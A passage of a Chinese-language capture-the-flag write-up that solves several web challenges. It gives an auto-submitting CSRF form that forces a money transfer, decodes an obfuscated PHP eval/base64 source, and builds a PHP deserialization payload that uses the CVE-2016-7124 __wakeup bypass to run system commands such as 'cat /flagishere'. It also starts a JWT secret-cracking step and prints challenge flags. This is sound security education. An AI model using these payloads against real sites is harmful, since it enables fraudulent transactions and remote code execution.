class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">javascript</span>&gt;</span><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;document.form1.submit()&quot;</span>,<span class="number">20</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">javascript</span>&gt;</span><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;document.form1.submit()&quot;</span>,<span class="number">1000</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pform = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        pform.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;postform&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://mc.vveelin.com.cn:8102/trans.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;q1jun&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;999999999999&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>把这个上传到有公网IP的服务器，将URL在反馈中提交，过一会就会得到金额：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221120015142958.png" alt="image-20221120015142958"></p><p>然后下单一份双皮奶就可以得到flag了。</p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;Dr1nk_V1P_t3a_4nd_3nj0y_C5RF&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x0c-题目：easyphp"><a href="#0x0c-题目：easyphp" class="headerlink" title="0x0c 题目：easyphp"></a>0x0c 题目：easyphp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./easyphp</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 250</span><br><span class="line">description:</span><br><span class="line">hint: 你能看懂这串代码的意思吗</span><br><span class="line">=== challenge info ===</span><br></pre></td></tr></table></figure><h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p>访问网站，摁F12得到hint：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hint: backup file --&gt;</span></span><br></pre></td></tr></table></figure><p><code>dirsearch</code>扫一下网址目录，得到备份文件<code>/index.php.bak</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Target: http://qc1119ff-671b-11ed-bc58-165319f5738e.challenge.sycsec.com/</span><br><span class="line"></span><br><span class="line">[16:30:37] Starting:</span><br><span class="line">[16:30:51] 200 -    2KB - /index.php.bak</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p>得到一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$O00OO0</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$O00O0O</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$O0OO00</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$OO0O00</span>=<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$O0OO00</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$OO0000</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$O00O0O</span>.=<span class="variable">$O00OO0</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">36</span>&#125;</span><br><span class="line">        .<span class="variable">$O00OO0</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$O00O0O</span>(<span class="string">&quot;JE8wTzAwMD0ianlIcUlZZHJNdVZ4a05RVWdlV2xidGFaUFJFRm9LSkNuQmh3RFhwQU9tZkdTaXZzY1RMenp3Y1h5a0VDbXNxTGdoUk5NWkpRYUd2ZldvRlVuU3RBeGpkVmlySXBiVHVPUEJEWWxlS0hXaTlWdmNwU2syTGRsM21NUlRRWWFjUXlmcnR3dko1eEVPOXNBeFlTeUFwTXlBcE15QWpWRUp0WXZKbU10T0Y3QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNFZHYycTFsQU1JQUJwTXlBcE15QXBNWlZuTXlBcE15QXBNeUFwTXlBcE15QXBNdGNvbnZybU1LZTRNa1BwOXlBdFRaY2RDeWNRREVQcEJiVm5NeUFwTXlBcE15YzBTQUJwTXlBcE15QXBNbGNxQmFPUXp5T2YxYVRoMHZKOXN5VTl1Zk9xSEVjdDFrM1JuU1JuTXlBcE15QXBNeWNZU3lBcE15QXBNeUFwTXlBcE15QXBNeU9xenZPOE10Y29udnJtTUtlNE1rUDRCcTI5M3l6WVN5QXBNeUFwTXlBajlBeDBTQVRoWWtyaEh5RnRkYTJFWWtKbzVaVm5NeUFwTXlBcE15Y2oxa1RMSWt3cGdrellTeUFwTXlBcE15QWpWRUp0WXZKbU10T203QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNvRE4zb3d2SjV4U0FnU3lBcE15QXBNeUFqN0FCcE15QXBNeUFwTXlBcE15QXBNeUFwZ0VPZElsd3BHV0JqQnlBMCt5T2RkbGNqNVNBbzB2T1FIeUEwK3lPbUliVm5NeUFwTXlBcE15YzBTdVJuU2syTGRsM21NcVRVc29PVXd2MmREYU8xUVpWbk15QXBNeUFwTXljajFrVExJa3dwZ2ZpWVNBQnBNeUFwTXlBcE1sY3FCYU9RenlPZjFhVGgwdko5c3lPZGRsY2o1U0FvemFKUklaVm5NeUFwTXlBcE15QXBNeUFwTXlBcE1mcmZkYUFNZ2syMWdTZVlTeUFwTXlBcE15QWo5QXgwU0FUUVRTT1FIbDJxMFNBb3VORjllcVVZeGwzb3d0MTBJU3JZU3lBcE15QXBNeUFqMWF4aFFsVFFkYU9RNmZQTWdyMWpXTjFvYXQzaDBsQkVFU2VZU3VSbj0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在本地进行简单的逆向出这段php对应的源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$O00OO0</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$O00O0O</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$O0OO00</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$OO0O00</span>=<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$O0OO00</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$OO0000</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$O00O0O</span>.=<span class="variable">$O00OO0</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">36</span>&#125;</span><br><span class="line">        .<span class="variable">$O00OO0</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$O00OO0</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$O00O0O</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$O0OO00</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$OO0000</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$O00O0O</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j</span></span><br><span class="line"><span class="comment">// base64_decode</span></span><br><span class="line"><span class="comment">// strtr</span></span><br><span class="line"><span class="comment">// 52</span></span><br><span class="line"><span class="comment">// base64_decode</span></span><br><span class="line"><span class="variable">$O0O000</span>=<span class="string">&quot;jyHqIYdrMuVxkNQUgeWlbtaZPREFoKJCnBhwDXpAOmfGSivscTLzzwcXykECmsqLghRNMZJQaGvfWoFUnStAxjdVirIpbTuOPBDYleKHWi9VvcpSk2Ldl3mMRTQYacQyfrtwvJ5xEO9sAxYSyApMyApMyAjVEJtYvJmMtOF7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3Edv2q1lAMIABpMyApMyApMZVnMyApMyApMyApMyApMyApMtconvrmMKe4MkPp9yAtTZcdCycQDEPpBbVnMyApMyApMyc0SABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syU9ufOqHEct1k3RnSRnMyApMyApMycYSyApMyApMyApMyApMyApMyOqzvO8MtconvrmMKe4MkP4Bq293yzYSyApMyApMyAj9Ax0SAThYkrhHyFtda2EYkJo5ZVnMyApMyApMycj1kTLIkwpgkzYSyApMyApMyAjVEJtYvJmMtOm7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3oDN3owvJ5xSAgSyApMyApMyAj7ABpMyApMyApMyApMyApMyApgEOdIlwpGWBjByA0+yOddlcj5SAo0vOQHyA0+yOmIbVnMyApMyApMyc0SuRnSk2Ldl3mMqTUsoOUwv2dDaO1QZVnMyApMyApMycj1kTLIkwpgfiYSABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syOddlcj5SAozaJRIZVnMyApMyApMyApMyApMyApMfrfdaAMgk21gSeYSyApMyApMyAj9Ax0SATQTSOQHl2q0SAouNF9eqUYxl3owt10ISrYSyApMyApMyAj1axhQlTQdaOQ6fPMgr1jWN1oat3h0lBEESeYSuRn=&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="variable">$OO0000</span>*<span class="number">2</span>),<span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="variable">$OO0000</span>,<span class="variable">$OO0000</span>),    </span><br><span class="line">        <span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="number">0</span>,<span class="variable">$OO0000</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BillyHerrington</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span> -&gt; a = <span class="string">&quot;fxxk you &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; a.<span class="string">&quot;Wow&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baoglady</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span> -&gt; b -&gt; <span class="title function_ invoke__">happy</span>(<span class="variable">$this</span> -&gt; c);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VanDarkholme</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;str&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出这是一题反序列化，最终需要利用的类为<code>VanDarkholme</code></p><p>构造序列化代码进行利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BillyHerrington</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title class_">Baoglady</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) #绕过<span class="title">wakeup</span> <span class="title">CVE</span>-2016-7124</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;fxxk you &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.<span class="string">&quot;Wow&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baoglady</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;b = <span class="keyword">new</span> <span class="title class_">VanDarkholme</span>();</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">happy</span>(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VanDarkholme</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">BillyHerrington</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">#O:15:&quot;BillyHerrington&quot;:1:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:15:&quot;system(&#x27;ls /&#x27;);&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>根据CVE-2016-7124进行绕过<code>__wakeup</code>函数，所以payload应改为：</p><blockquote><p>CVE-2016-7124 原理简单来说就是通过传递的序列化更改对象数量值，使之大于现有的传入对象，可以绕过<code>__wakeup</code>魔法函数的执行。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:15:&quot;BillyHerrington&quot;:2:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:15:&quot;system(&#x27;ls /&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118171518748.png" alt="image-20221118171518748"></p><p>所以最终payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:15:&quot;BillyHerrington&quot;:2:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:26:&quot;system(&#x27;cat /flagishere&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118171638541.png" alt="image-20221118171638541"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;XD_why_php_s0_1nter3sting&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x0d-题目：easygame"><a href="#0x0d-题目：easygame" class="headerlink" title="0x0d 题目：easygame"></a>0x0d 题目：easygame</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./easygame</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 250</span><br><span class="line">description: http://121.5.62.30:40050/</span><br><span class="line">hint: 字典: 链接：https://pan.baidu.com/s/1Fgp6xyDbykwQE6UyTZ6-bA?pwd=1234 提取码：1234</span><br><span class="line">=== challenge info ===</span><br></pre></td></tr></table></figure><h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入网址，根据提示先new一个User：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/newUser?userName=Syclover&amp;password=666</span><br></pre></td></tr></table></figure><p>得到提示，是一串token：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成功辣，带上这个去/secure/admin试试运气吧:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6IlN5Y2xvdmVyIiwiZXhwIjoxNjY4NzY1MTU0LCJpYXQiOjE2Njg3NjMzNTR9._GoRgp06XkKKLs_T2EpphREcS8zVL-DzQI85ikps6K4</span><br></pre></td></tr></table></figure><p>传入<code>/secure/admin</code>路径后得到：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/html;charset=UTF-8</span></span><br><span class="line"><span class="attr">Date:</span> <span class="string">Fri,</span> <span class="number">18</span> <span class="string">Nov</span> <span class="number">2022 09:24:21 </span><span class="string">GMT</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">89</span></span><br><span class="line"></span><br><span class="line"><span class="string">当前用户信息id=1,userName=Syclover,password=666</span> <span class="string">不是admin不能继续下一关哦</span></span><br></pre></td></tr></table></figure><p>token不是admin用户的，需要根据题目给的字典进行爆破JWTtoken的 <strong>secret</strong>，爆破脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 